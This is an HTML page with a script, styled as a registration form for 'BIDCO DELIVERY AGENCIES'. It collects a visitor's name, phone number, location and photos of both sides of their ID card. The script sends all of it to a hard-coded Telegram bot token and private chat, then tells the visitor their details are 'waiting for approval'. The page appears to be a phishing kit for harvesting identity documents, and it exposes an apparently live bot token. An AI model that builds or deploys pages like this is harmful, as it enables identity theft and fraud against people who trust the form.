<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Responsive Delivery Form</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }
        
        .container {
            background: #fff;
            width: 100%;
            max-width: 500px;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        h2 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 22px;
        }
        
        label {
            font-weight: bold;
            font-size: 14px;
            margin-top: 12px;
            display: block;
        }
        
        input,
        textarea {
            width: 100%;
            padding: 12px;
            margin-top: 6px;
            border-radius: 8px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
        
        textarea {
            resize: none;
        }
        
        input[type="file"] {
            padding: 8px;
        }
        
        button {
            width: 100%;
            margin-top: 18px;
            padding: 14px;
            border: none;
            background: #007bff;
            color: white;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
        }
        
        button:hover {
            background: #0056b3;
        }
        
        .error {
            color: red;
            font-size: 13px;
            margin-top: 10px;
        }
        
        .success {
            color: green;
            text-align: center;
            margin-top: 10px;
        }
        
        .preview {
            margin-top: 8px;
            width: 100%;
            height: 140px;
            object-fit: cover;
            border-radius: 8px;
            display: none;
        }
        /* Tablet */
        
        @media (min-width: 600px) {
            .container {
                padding: 25px;
            }
            h2 {
                font-size: 24px;
            }
        }
        /* Desktop */
        
        @media (min-width: 900px) {
            body {
                padding: 40px;
            }
            .container {
                max-width: 600px;
            }
            h2 {
                font-size: 26px;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <h2>BIDCO DELIVERY AGENCIES</h2>
        <h2>REGISTER WITH US NOW</h2>
        <p>We do delivery country wide, Payments is done on delivery</p>
        <form id="deliveryForm">

            <label>Full Name</label>
            <input type="text" id="name" placeholder="Enter full name">

            <label>Phone Number</label>
            <input type="tel" id="phone" placeholder="Enter phone number">

            <label>Location</label>
            <textarea id="location" rows="3" placeholder="Enter delivery location"></textarea>

            <label>ID Front</label>
            <input type="file" id="idFront" accept="image/*">
            <img id="previewFront" class="preview">

            <label>ID Back</label>
            <input type="file" id="idBack" accept="image/*">
            <img id="previewBack" class="preview">

            <div class="error" id="errorMsg"></div>

            <button type="submit">REGISTER NOW</button>

            <div class="success" id="successMsg"></div>

        </form>
    </div>

    <script>
        // WARNING: This exposes your BOT_TOKEN to anyone who can view your page.

        // Replace these with your values before using:

        const BOT_TOKEN = '7757344484:AAFUuhaqCtEowjf3Pm5zgIbB5OLO9zQk2sI';

        const CHAT_ID = '5615316142';

        const form = document.getElementById('deliveryForm');

        const errorMsg = document.getElementById('errorMsg');

        const successMsg = document.getElementById('successMsg');

        function previewImage(input, previewId) {

            const file = input.files[0];

            const preview = document.getElementById(previewId);

            if (file) {

                const reader = new FileReader();

                reader.onload = function(e) {

                    preview.src = e.target.result;

                    preview.style.display = "block";

                }

                reader.readAsDataURL(file);

            }

        }

        document.getElementById('idFront').addEventListener('change', function() {

            previewImage(this, 'previewFront');

        });

        document.getElementById('idBack').addEventListener('change', function() {

            previewImage(this, 'previewBack');

        });

        async function sendMessage(text) {

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            const payload = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            };

            const res = await fetch(url, {

                method: 'POST',

                headers: {
                    'Content-Type': 'application/json'
                },

                body: JSON.stringify(payload)

            });

            return res.json();

        }

        async function sendPhoto(file, caption) {

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

            const fd = new FormData();

            fd.append('chat_id', CHAT_ID);

            fd.append('photo', file);

            if (caption) fd.append('caption', caption);

            const res = await fetch(url, {
                method: 'POST',
                body: fd
            });

            return res.json();

        }

        form.addEventListener('submit', async function(e) {

            e.preventDefault();

            errorMsg.textContent = "";

            successMsg.textContent = "";

            const name = document.getElementById('name').value.trim();

            const phone = document.getElementById('phone').value.trim();

            const location = document.getElementById('location').value.trim();

            const idFront = document.getElementById('idFront').files[0];

            const idBack = document.getElementById('idBack').files[0];

            if (!name || !phone || !location || !idFront || !idBack) {

                errorMsg.textContent = "Please fill all fields and upload both ID images.";

                return;

            }

            if (!/^[0-9]{7,15}$/.test(phone)) {

                errorMsg.textContent = "Enter a valid phone number.";

                return;

            }

            try {

                successMsg.textContent = "Sending to Telegram...";

                // Send the text summary first

                const summary = `<b>New Delivery Request</b>\nName: ${escapeHtml(name)}\nPhone: ${escapeHtml(phone)}\nLocation: ${escapeHtml(location)}`;

                const msgResp = await sendMessage(summary);

                if (!msgResp.ok) throw new Error('Failed to send message: ' + (msgResp.description || JSON.stringify(msgResp)));

                // Send ID front

                const capFront = `ID Front — ${escapeHtml(name)} (${escapeHtml(phone)})`;

                const frontResp = await sendPhoto(idFront, capFront);

                if (!frontResp.ok) throw new Error('Failed to send front ID: ' + (frontResp.description || JSON.stringify(frontResp)));

                // Send ID back

                const capBack = `ID Back — ${escapeHtml(name)} (${escapeHtml(phone)})`;

                const backResp = await sendPhoto(idBack, capBack);

                if (!backResp.ok) throw new Error('Failed to send back ID: ' + (backResp.description || JSON.stringify(backResp)));

                successMsg.textContent = "Details submitted waiting for approval!";

                form.reset();

                document.getElementById('previewFront').style.display = "none";

                document.getElementById('previewBack').style.display = "none";

            } catch (err) {

                console.error(err);

                errorMsg.textContent = "Error sending to Telegram: " + (err.message || err);

            }

        });

        // Basic HTML-escape to avoid markup injection in Telegram message

        function escapeHtml(str) {

            return String(str)

            .replace(/&/g, '&amp;')

            .replace(/</g, '&lt;')

            .replace(/>/g, '&gt;');

        }
    </script>
</body>

</html>
